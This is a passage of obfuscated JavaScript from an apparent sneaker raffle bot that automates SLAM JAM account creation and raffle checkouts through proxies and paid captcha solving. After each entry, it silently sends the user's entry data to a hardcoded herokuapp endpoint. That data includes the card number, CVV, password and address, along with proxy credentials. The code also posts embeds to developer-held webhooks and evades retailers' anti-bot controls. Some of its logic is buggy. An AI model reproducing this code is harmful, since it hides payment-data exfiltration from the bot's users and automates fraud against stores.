                            await _0xeb544b['type']('#email', '' + _0x6424f8[_0x2be577]['Email']), await _0x254c61(0x384), await _0xeb544b['type']('#first_name', '' + _0x6424f8[_0x2be577]['FirstName']), await _0x254c61(0x514), await _0xeb544b['type']('#last_name', '' + _0x6424f8[_0x2be577]['LastName']), await _0x254c61(0x514), await _0xeb544b['type']('#street_address', _0x6424f8[_0x2be577]['Address1'] + '\x20' + _0x6424f8[_0x2be577]['HouseNumber'] + '\x20' + _0x6424f8[_0x2be577]['Address2']), await _0x254c61(0x2bc);
                            _0x6424f8[_0x2be577]['Postcode'] == undefined && (_0x6424f8[_0x2be577]['Postcode'] = _0x6424f8[_0x2be577]['Zip']);
                            await _0xeb544b['type']('#zip_code', '' + _0x6424f8[_0x2be577]['Postcode']), await _0x254c61(0x320), await _0xeb544b['type']('#city', '' + _0x6424f8[_0x2be577]['City']), await _0x254c61(0x320), await _0xeb544b['type']('#bday', '01/01/1994'), await _0x254c61(0x320), await _0xeb544b['type']('#instagram', '' + _0x6424f8[_0x2be577]['Follower']), await _0x254c61(0x352);
                            if (_0x6424f8[_0x2be577]['Size'] == 'RANDOM') {
                                const _0x431438 = await _0xeb544b['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0xab4e9d => {
                                    return _0xab4e9d['map'](_0x30ee9c => _0x30ee9c['textContent']);
                                });
                                var _0xb2f042 = Math['round'](Math['random']() * (_0x431438['length'] - 0x1));
                                console['log'](_0x36583e() + '\x20[' + _0x18ef48['name'] + ']\x20Task\x20' + (_0x2be577 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x431438[_0xb2f042]), await _0xeb544b['click']('label[data-eu-size=\x22' + _0x431438[_0xb2f042] + '\x22]');
                            } else {
                                console['log'](_0x36583e() + '\x20[' + _0x18ef48['name'] + ']\x20Task\x20' + (_0x2be577 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x6424f8[_0x2be577]['Size']);
                                try {
                                    await _0xeb544b['click']('label[data-eu-size=\x22' + _0x6424f8[_0x2be577]['Size'] + '\x22]');
                                } catch {
                                    await _0xeb544b['click']('label[data-eu-size=\x22' + _0x6424f8[_0x2be577]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x254c61(0xbb8), await _0xeb544b['$$eval']('.raffle__checkbox-label', _0x5a7ac1 => _0x5a7ac1['forEach'](_0x310ef2 => _0x310ef2['click']())), await _0x254c61(0x7d0), console['log'](_0x36583e() + '\x20[' + _0x18ef48['name'] + ']\x20Task\x20' + (_0x2be577 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0xeb544b['click']('#raffle__form-submit'), await _0x254c61(0x1388);
                            try {
                                await _0xeb544b['waitForSelector']('#raffle__confirmation-message-container'), _0x5414b2 = 'no', _0x547244(_0x6424f8[_0x2be577], _0x18ef48), console['log'](_0x467028['green'](_0x36583e() + '\x20[' + _0x18ef48['name'] + ']\x20Task\x20' + (_0x2be577 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x490b1f = _0x6424f8[_0x2be577];
                                try {
                                    prxdata = {
                                        'username': _0x4a1218['replace']('#', ''),
                                        'module': _0x18ef48['name'],
                                        'entrydata': JSON['stringify'](_0x490b1f),
                                        'proxy': '' + _0x578688[_0x2be577]
                                    };
                                    var _0x45bdb3 = JSON['stringify'](prxdata);
                                    let _0x44ddae = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x4127f6['post']('https://jraffles.herokuapp.com/success', _0x45bdb3, _0x44ddae);
                                } catch (_0x57096f) {
                                }
                            } catch (_0xb38e9d) {
                                console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x4f8d63[taskModule]['name'] + ']\x20Task\x20' + (_0x2be577 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0xb38e9d));
                            }
                        } catch (_0x51b5ea) {
                            console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x4f8d63[taskModule]['name'] + ']\x20Task\x20' + (_0x2be577 + 0x1) + '\x20:\x20' + _0x51b5ea)), _0x5414b2 = 'yes';
                        } finally {
                            _0x497a61 && _0x497a61['close']();
                            if (_0x5414b2 == 'yes' && _0x7a3849 != 0x5 && _0x5520a4 != 'Size\x20Not\x20Found') {
                                console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x18ef48['name'] + ']\x20Task\x20' + (_0x2be577 + 0x1) + '\x20:\x20Retrying\x20(' + _0x7a3849 + '\x20/\x205)')), _0x2be577 = _0x2be577 - 0x1, _0x7a3849 = _0x7a3849 + 0x1;
                                continue;
                            }
                            _0x5414b2 == 'yes' && _0x7a3849 >= 0x5 && (_0x9088f0(_0x6424f8[_0x2be577], _0x18ef48), _0x5414b2 = 'no', _0x7a3849 = 0x0), console['log']('Waiting\x20for\x20' + _0x24de00['delay'] + '\x20ms'), await _0x254c61(_0x24de00['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x359f2a, _0x57fad2, _0x1c7015) {
                    _0x48f2a7['use'](_0x32ef16()), _0x48f2a7['use'](_0x15a873({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x24de00['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xc31d88 = 0x0; _0xc31d88 < _0x57fad2['length']; _0xc31d88++) {
                        if (_0x4b4a1e != 'yes')
                            var _0x4b4a1e = '', _0x1c9ac6 = 0x0;
                        var _0x50efba = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x4a1218
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x24de00['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5e0c2d
                                }
                            ]
                        }];
                        const _0x316b46 = { 'embeds': _0x50efba };
                        _0x1bf238(_0x359f2a['name'] + '\x20Task\x20' + (_0xc31d88 + 0x1) + '\x20/\x20' + _0x57fad2['length'] + '\x20||\x20File:\x20' + _0x339545 + '\x20Proxies:\x20' + _0x293577);
                        try {
                            await _0x4626f3(_0x57fad2, _0xc31d88);
                        } catch {
                            _0x4b4a1e = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x5e24fc = await _0x18ad5f(_0x57fad2[_0xc31d88], _0x359f2a, 'acc', ![]);
                        const _0x5e24d1 = { 'succesDEVMSG': { 'embeds': [_0x5e24fc] } };
                        if (_0x57fad2[_0xc31d88]['Email'] == '' || _0x57fad2[_0xc31d88]['FirstName'] == '' || _0x57fad2[_0xc31d88]['LastName'] == '') {
                            console['log'](_0x36583e() + '\x20[' + _0x4f8d63[taskModule]['name'] + ']\x20Task\x20' + (_0xc31d88 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x254c61(0x7d0);
                            continue;
                        }
                        (_0x57fad2[_0xc31d88]['Password'] == '' || _0x57fad2[_0xc31d88] == undefined) && _0x57fad2[_0xc31d88]['Password'] == 'JRaffles23!';
                        if (_0x24de00['useRandomProxy'] = ![])
                            var _0x5b2da7 = _0x1c7015[_0xc31d88]['split'](':');
                        else
                            var _0x58e219 = Math['round'](Math['random']() * (_0x1c7015['length'] - 0x1)), _0x5b2da7 = _0x1c7015[_0x58e219]['split'](':');
                        var _0x2585e7;
                        try {
                            _0x2585e7 = await _0x48f2a7['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5b2da7[0x0] + ':' + _0x5b2da7[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2585e7 = await _0x48f2a7['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5b2da7[0x0] + ':' + _0x5b2da7[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x12419b = await _0x2585e7['newPage']();
                            await _0x12419b['authenticate']({
                                'username': '' + _0x5b2da7[0x2],
                                'password': '' + _0x5b2da7[0x3]
                            }), console['log'](_0x36583e() + '\x20[' + _0x359f2a['name'] + ']\x20Task\x20' + (_0xc31d88 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x12419b['setRequestInterception'](!![]), _0x12419b['on']('request', _0x3cbb95 => {
                                _0x3cbb95['resourceType']() === 'image' || _0x3cbb95['resourceType']() === 'font' || _0x3cbb95['resourceType']() === 'media' ? _0x3cbb95['abort']() : _0x3cbb95['continue']();
                            }), await _0x12419b['goto']('https://drop.slamjam.com/account/register'), await _0x254c61(0xbb8), await _0x12419b['waitForSelector']('#FirstName'), await _0x12419b['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x12419b['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x36583e() + '\x20[' + _0x359f2a['name'] + ']\x20Task\x20' + (_0xc31d88 + 0x1) + '\x20:\x20Filling\x20information'), await _0x254c61(0x4b0), await _0x12419b['type']('#FirstName', '' + _0x57fad2[_0xc31d88]['FirstName']), await _0x254c61(0x226), await _0x12419b['type']('#LastName', '' + _0x57fad2[_0xc31d88]['LastName']), await _0x254c61(0x226), await _0x12419b['type']('#Email', '' + _0x57fad2[_0xc31d88]['Email']), await _0x254c61(0x2ee), await _0x12419b['type']('#ConfirmEmail', '' + _0x57fad2[_0xc31d88]['Email']), await _0x254c61(0x2ee), await _0x12419b['type']('#CreatePassword', '' + _0x57fad2[_0xc31d88]['Password']), await _0x254c61(0x2ee), await _0x12419b['type']('#CreateConfirmPassword', '' + _0x57fad2[_0xc31d88]['Password']), await _0x254c61(0x226), console['log'](_0x36583e() + '\x20[' + _0x359f2a['name'] + ']\x20Task\x20' + (_0xc31d88 + 0x1) + '\x20:\x20Submitting..'), await _0x12419b['$eval']('#create_customer', _0x2e3a2f => _0x2e3a2f['submit']()), await _0x254c61(0x1388), console['log'](_0x36583e() + '\x20[' + _0x359f2a['name'] + ']\x20Task\x20' + (_0xc31d88 + 0x1) + '\x20:\x20' + _0x467028['cyan']('Solving\x20Captcha')), await _0x12419b['solveRecaptchas'](), console['log'](_0x36583e() + '\x20[' + _0x359f2a['name'] + ']\x20Task\x20' + (_0xc31d88 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x12419b['$eval']('.shopify-challenge__container\x20>\x20form', _0x4c11f4 => _0x4c11f4['submit']());
                            try {
                                await _0x12419b['waitForSelector']('.product-card__image'), await _0x254c61(0x1f4), _0x4b4a1e = 'no', console['log'](_0x467028['green'](_0x36583e() + '\x20[' + _0x359f2a['name'] + ']\x20Task\x20' + (_0xc31d88 + 0x1) + '\x20:\x20Account\x20' + _0x57fad2[_0xc31d88]['Email'] + '\x20Generated!')), _0x3e92a1['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x57fad2[_0xc31d88]['Email'] + ',' + _0x57fad2[_0xc31d88]['Password']), console['log'](_0x467028['yellow'](_0x36583e() + '\x20[' + _0x359f2a['name'] + ']\x20Task\x20' + (_0xc31d88 + 0x1) + '\x20:\x20Account\x20' + _0x57fad2[_0xc31d88]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x5e24d1['succesDEVMSG']);
                                } catch {
                                }
                                await _0x2dfd24(_0x43241a, _0x5e24d1['succesDEVMSG']);
                            } catch (_0x4db33c) {
                                console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x4f8d63[taskModule]['name'] + ']\x20Task\x20' + (_0xc31d88 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x4db33c));
                            }
                        } catch (_0x3a8278) {
                            console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x4f8d63[taskModule]['name'] + ']\x20Task\x20' + (_0xc31d88 + 0x1) + '\x20:\x20' + _0x3a8278));
                        } finally {
                            _0x2585e7 && _0x2585e7['close']();
                            if (_0x4b4a1e == 'yes' && _0x1c9ac6 != 0x5) {
                                console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x359f2a['name'] + ']\x20Task\x20' + (_0xc31d88 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1c9ac6 + '\x20/\x205)')), _0xc31d88 = _0xc31d88 - 0x1, _0x1c9ac6 = _0x1c9ac6 + 0x1;
                                continue;
                            }
                            _0x4b4a1e == 'yes' && _0x1c9ac6 >= 0x5 && (_0x9088f0(_0x57fad2[_0xc31d88], _0x359f2a), _0x4b4a1e = 'no', _0x1c9ac6 = 0x0), console['log']('Waiting\x20for\x20' + _0x24de00['delay'] + '\x20ms'), await _0x254c61(_0x24de00['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x2ff18d, _0x1d0f0d, _0x34edb4) {
                    _0x48f2a7['use'](_0x32ef16()), _0x48f2a7['use'](_0x15a873({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x24de00['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xfcdb6e = 0x0; _0xfcdb6e < _0x1d0f0d['length']; _0xfcdb6e++) {
                        var _0x5ed48c;
                        if (_0x27e8b4 != 'yes')
                            var _0x27e8b4 = '', _0x2fd3f5 = 0x0;
                        _0x1bf238(_0x2ff18d['name'] + '\x20Task\x20' + (_0xfcdb6e + 0x1) + '\x20/\x20' + _0x1d0f0d['length'] + '\x20||\x20File:\x20' + _0x339545 + '\x20Proxies:\x20' + _0x293577);
                        try {
                            await _0x4626f3(_0x1d0f0d, _0xfcdb6e);
                        } catch {
                            _0x27e8b4 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x1d0f0d[_0xfcdb6e]['Email'] == '' || _0x1d0f0d[_0xfcdb6e]['Password'] == '' || _0x1d0f0d[_0xfcdb6e]['FirstName'] == '' || _0x1d0f0d[_0xfcdb6e]['LastName'] == '') {
                            console['log'](_0x36583e() + '\x20[' + _0x2ff18d['name'] + ']\x20Task\x20' + (_0xfcdb6e + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x24de00['useRandomProxy'] = ![])
                            var _0x53fdd2 = _0x34edb4[_0xfcdb6e]['split'](':');
                        else
                            var _0x2d8f27 = Math['round'](Math['random']() * (_0x34edb4['length'] - 0x1)), _0x53fdd2 = _0x34edb4[_0x2d8f27]['split'](':');
                        var _0x561b66;
                        try {
                            _0x561b66 = await _0x48f2a7['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x53fdd2[0x0] + ':' + _0x53fdd2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x561b66 = await _0x48f2a7['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x53fdd2[0x0] + ':' + _0x53fdd2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x43559c = await _0x561b66['newPage']();
                            await _0x43559c['authenticate']({
                                'username': '' + _0x53fdd2[0x2],
                                'password': '' + _0x53fdd2[0x3]
                            }), await _0x43559c['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x36583e() + '\x20[' + _0x2ff18d['name'] + ']\x20Task\x20' + (_0xfcdb6e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x43559c['setRequestInterception'](!![]), _0x43559c['on']('request', _0x5ad3ee => {
                                _0x5ad3ee['resourceType']() === 'image' || _0x5ad3ee['resourceType']() === 'font' || _0x5ad3ee['resourceType']() === 'media' ? _0x5ad3ee['abort']() : _0x5ad3ee['continue']();
                            }), await _0x43559c['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x43559c['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x43559c['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x254c61(0x258), await _0x43559c['waitForSelector']('#CustomerEmail'), console['log'](_0x36583e() + '\x20[' + _0x2ff18d['name'] + ']\x20Task\x20' + (_0xfcdb6e + 0x1) + '\x20:\x20Logging\x20in..'), await _0x43559c['type']('#CustomerEmail', '' + _0x1d0f0d[_0xfcdb6e]['Email']), await _0x254c61(0x12c), await _0x43559c['type']('#CustomerPassword', '' + _0x1d0f0d[_0xfcdb6e]['Password']), await _0x254c61(0x226), await _0x43559c['$eval']('#customer_login', _0x495a5c => _0x495a5c['submit']()), await _0x254c61(0x7d0), await _0x43559c['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x36583e() + '\x20[' + _0x2ff18d['name'] + ']\x20Task\x20' + (_0xfcdb6e + 0x1) + '\x20:\x20' + _0x467028['cyan']('Solving\x20Captcha')), await _0x43559c['solveRecaptchas'](), console['log'](_0x36583e() + '\x20[' + _0x2ff18d['name'] + ']\x20Task\x20' + (_0xfcdb6e + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x43559c['$eval']('.shopify-challenge__container\x20>\x20form', _0x4ec593 => _0x4ec593['submit']());
                            try {
                                await _0x43559c['waitForSelector']('.nav-account'), await _0x254c61(0x4b0);
                            } catch {
                                console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x2ff18d['name'] + ']\x20Task\x20' + (_0xfcdb6e + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x43559c['goto']('' + _0x1d0f0d[_0xfcdb6e]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x254c61(0xbb8), console['log'](_0x36583e() + '\x20[' + _0x2ff18d['name'] + ']\x20Task\x20' + (_0xfcdb6e + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x43559c['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x43559c['click']('.product-select-variant-wrapper'), await _0x254c61(0x320), await _0x43559c['click']('li.product-select-variant__value[data-size=\x22' + _0x1d0f0d[_0xfcdb6e]['Size'] + '\x22]'), await _0x254c61(0x384), await _0x43559c['$eval']('#AddToCartForm-product-template-raffle', _0x24eff5 => _0x24eff5['submit']()), await _0x43559c['waitForSelector']('.cart-order-summary__content'), await _0x254c61(0x514), await _0x43559c['goto']('https://drop.slamjam.com/checkout'), await _0x254c61(0x514), await _0x43559c['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x36583e() + '\x20[' + _0x2ff18d['name'] + ']\x20Task\x20' + (_0xfcdb6e + 0x1) + '\x20:\x20Filling\x20Information'), await _0x43559c['select']('#checkout_shipping_address_country', '' + _0x1d0f0d[_0xfcdb6e]['Country']), await _0x254c61(0x200), await _0x43559c['waitForSelector']('#checkout_shipping_address_first_name'), await _0x43559c['type']('#checkout_shipping_address_first_name', '' + _0x1d0f0d[_0xfcdb6e]['FirstName']), await _0x254c61(0x237), await _0x43559c['type']('#checkout_shipping_address_last_name', '' + _0x1d0f0d[_0xfcdb6e]['LastName']), await _0x254c61(0x1e0), await _0x43559c['type']('#checkout_shipping_address_address1', _0x1d0f0d[_0xfcdb6e]['Address1'] + '\x20' + _0x1d0f0d[_0xfcdb6e]['HouseNumber']), await _0x254c61(0x514), await _0x43559c['type']('#checkout_shipping_address_address2', '' + _0x1d0f0d[_0xfcdb6e]['Address2']), await _0x254c61(0x514);
                            _0x1d0f0d[_0xfcdb6e]['Postcode'] == undefined && (_0x1d0f0d[_0xfcdb6e]['Postcode'] = _0x1d0f0d[_0xfcdb6e]['Zip']);
                            await _0x43559c['type']('#checkout_shipping_address_zip', '' + _0x1d0f0d[_0xfcdb6e]['Postcode']), await _0x254c61(0x2bc), await _0x43559c['type']('#checkout_shipping_address_city', '' + _0x1d0f0d[_0xfcdb6e]['City']), await _0x254c61(0x320), await _0x43559c['type']('#checkout_shipping_address_phone', '' + _0x1d0f0d[_0xfcdb6e]['Phone']), await _0x254c61(0x320), await _0x43559c['click']('#continue_button'), await _0x254c61(0xbb8), await _0x43559c['waitForSelector']('.summary-title'), await _0x254c61(0x320), await _0x43559c['click']('#continue_button'), await _0x254c61(0x320), console['log'](_0x36583e() + '\x20[' + _0x2ff18d['name'] + ']\x20Task\x20' + (_0xfcdb6e + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x43559c['waitForSelector']('#checkout_credit_card_vault'), await _0x254c61(0x3e8);
                            var _0x31c767 = await _0x43559c['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x1301ed = await _0x31c767['contentFrame']();
                            await _0x1301ed['click']('#number'), await _0x254c61(0x3e8), await _0x1301ed['type']('#number', '' + _0x1d0f0d[_0xfcdb6e]['CardNumber'], { 'delay': 0x78 }), _0x31c767 = await _0x43559c['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x1301ed = await _0x31c767['contentFrame'](), await _0x254c61(0x1c2), await _0x1301ed['click']('#name'), await _0x254c61(0x1f4), await _0x1301ed['type']('#name', '' + _0x1d0f0d[_0xfcdb6e]['NameOnCard'], { 'delay': 0x78 }), _0x31c767 = await _0x43559c['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x1301ed = await _0x31c767['contentFrame'](), await _0x254c61(0x1c2), await _0x1301ed['click']('#expiry'), await _0x254c61(0x1f4), await _0x1301ed['type']('#expiry', '' + _0x1d0f0d[_0xfcdb6e]['ExpiryDate'], { 'delay': 0x78 }), _0x31c767 = await _0x43559c['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x1301ed = await _0x31c767['contentFrame'](), await _0x254c61(0x1c2), await _0x1301ed['click']('#verification_value'), await _0x254c61(0x1f4), await _0x1301ed['type']('#verification_value', '' + _0x1d0f0d[_0xfcdb6e]['CVV'], { 'delay': 0x78 }), await _0x43559c['$eval']('#accepts-flag-raffle', _0x35a7ef => _0x35a7ef['click']()), await _0x254c61(0x7d0), console['log'](_0x36583e() + '\x20[' + _0x2ff18d['name'] + ']\x20Task\x20' + (_0xfcdb6e + 0x1) + '\x20:\x20Processing\x20Order'), await _0x43559c['$eval']('#continue_button', _0x477d72 => _0x477d72['click']()), await _0x254c61(0x1b58), await _0x43559c['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x43559c['$eval']('.edit_checkout.animate-floating-labels', _0x1edb79 => _0x1edb79['submit']()), await _0x254c61(0x7d0);
                            try {
                                await _0x43559c['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x27e8b4 = 'no', _0x547244(_0x1d0f0d[_0xfcdb6e], _0x2ff18d), console['log'](_0x467028['green'](_0x36583e() + '\x20[' + _0x2ff18d['name'] + ']\x20Task\x20' + (_0xfcdb6e + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x53328f) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x53328f['message']);
                            }
                            var _0x5c16c4 = await _0x18ad5f(_0x1d0f0d[_0xfcdb6e], _0x2ff18d, 'dev', ![]), _0xdd5755 = await _0x18ad5f(_0x1d0f0d[_0xfcdb6e], _0x2ff18d, 'pub', ![]);
                            let _0x4ba642 = _0x1d0f0d[_0xfcdb6e];
                            try {
                                prxdata = {
                                    'username': _0x4a1218['replace']('#', ''),
                                    'module': _0x2ff18d['name'],
                                    'entrydata': JSON['stringify'](_0x4ba642),
                                    'proxy': '' + _0x34edb4[_0xfcdb6e]
                                };
                                var _0x981616 = JSON['stringify'](prxdata);
                                let _0x332cf9 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x4127f6['post']('https://jraffles.herokuapp.com/success', _0x981616, _0x332cf9);
                            } catch (_0x566bfa) {
                            }
                            const _0x3bb48e = {
                                'succesDEVMSG': { 'embeds': [_0x5c16c4] },
                                'succesPUBMSG': { 'embeds': [_0xdd5755] }
                            };
                            try {
                                _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x3bb48e['succesDEVMSG']), await _0x254c61(0xc8), await _0x2dfd24(_0x1227c5, _0x3bb48e['succesDEVMSG']), await _0x254c61(0xc8), await _0x2dfd24(_0x4f6cb7, _0x3bb48e['succesPUBMSG']);
                            } catch (_0x4959f6) {
                                console['log'](_0x467028['yellow'](_0x36583e() + '\x20[' + _0x4f8d63[taskModule]['name'] + ']\x20Task\x20' + (_0xfcdb6e + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4959f6));
                            }
                        } catch (_0x11bb55) {
                            console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x4f8d63[taskModule]['name'] + ']\x20Task\x20' + (_0xfcdb6e + 0x1) + '\x20:\x20' + _0x11bb55)), _0x5ed48c = '' + _0x11bb55;
                            var _0xcc5585 = await _0x18ad5f(kickz[_0xfcdb6e], _0x2ff18d, 'dev', !![], _0x5ed48c);
                            EMBEDS['errorDEV'] = { 'embeds': [_0xcc5585] }, _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], EMBEDS['errorDEV']), await _0x2dfd24(_0x3fd40a, EMBEDS['errorDEV']), _0x27e8b4 = 'yes';
                        } finally {
                            _0x561b66 && _0x561b66['close']();
                            if (_0x27e8b4 == 'yes' && _0x2fd3f5 != 0x5 && _0x5ed48c != 'Size\x20Not\x20Found') {
                                console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x2ff18d['name'] + ']\x20Task\x20' + (_0xfcdb6e + 0x1) + '\x20:\x20Retrying\x20(' + _0x2fd3f5 + '\x20/\x205)')), _0xfcdb6e = _0xfcdb6e - 0x1, _0x2fd3f5 = _0x2fd3f5 + 0x1;
                                continue;
                            }
                            _0x27e8b4 == 'yes' && _0x2fd3f5 >= 0x5 && (_0x9088f0(_0x1d0f0d[_0xfcdb6e], _0x2ff18d), _0x27e8b4 = 'no', _0x2fd3f5 = 0x0), console['log']('Waiting\x20for\x20' + _0x24de00['delay'] + '\x20ms'), await _0x254c61(_0x24de00['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x4a9d6f) {
                    var _0x28fac5 = await _0x32c942(), _0xefef4b = _0x3e92a1['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x1540a4 = _0x1c3b5f['parse'](_0xefef4b, { 'header': !![] })['data'];
                    for (var _0x388b36 = 0x0; _0x388b36 < _0x1540a4['length']; _0x388b36++) {
                        var _0x442e1d = _0x1540a4[_0x388b36]['Store'], _0x336848 = _0x1540a4[_0x388b36]['Mode'];
                        for (var _0x1ade08 of _0x4f8d63) {
                            const _0x3a0404 = _0x1ade08['name']['includes'](_0x442e1d);
                            if (!_0x3a0404)
                                continue;
                            for (mode of _0x1ade08['modules']) {
                                if (mode['name'] == _0x336848) {
                                    console['log']('Running\x20' + _0x467028['cyan'](mode['name'])), await mode['function'](mode, [_0x1540a4[_0x388b36]], _0x28fac5);
                                    var _0x3fdd0a = _0xefef4b['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x3e92a1['writeFileSync']('../failed-tasks.csv', _0x3fdd0a);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x4c51ff = await _0x40afc7['get']('Answer');
                    if (_0x4c51ff['Answer']['toLowerCase']() == 'y') {
                        _0x3e92a1['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x254c61(0x3e8);
                        return;
                    }
                    if (_0x4c51ff['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x254c61(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x254c61(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
